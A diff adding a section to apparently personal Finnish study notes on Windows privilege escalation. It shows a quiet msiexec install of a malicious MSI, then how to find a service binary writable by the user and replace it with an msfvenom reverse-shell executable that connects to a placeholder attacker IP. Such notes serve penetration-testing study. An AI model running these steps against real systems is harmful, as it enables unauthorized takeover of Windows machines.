@@ -85,3 +85,23 @@ ja vastaavilla asetuksilla Metasploit Handler vastaanottamaan yhteys. Kun maltsu
 ```cmd
 msiexec /quiet /qn /i C:\polku\kohteeseen\maltsu.msi
 ```
+**Servicet**
+
+Servicet pyörivät Service Control Managerin (SCM) kautta. Jokaisella servicellä on vastaava ohjelma, joka ajetaan. Servicestä tietoa esim.
+```cmd
+sc qc apphostsvc
+```
+BINARY_PATH_NAME = ohjelman polku, SERVICE_START_NAME = tunnus, jolla service käynnistetään.
+
+Tarkistetaan ohjelman oikeudet icaclsilla:
+```cmd
+icacls C:\polku\ohjelmaan\service.exe
+```
+Jos käyttäjällä muokkausoikeudet (M)/(F), voidaan uudelleenkirjoittaa ko. ohjelma ja se ajetaan servicen ajavalla käyttäjätunnuksella. msfvenom payload esim:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=*Hyökkääjän IP* LPORT=*Hyökkääjän portti* -f exe-service -o service.exe
+```
+Siirretään päälle, ja annetaan oikeudet:
+```cmd
+icacls service.exe /grant Everyone:F
+```
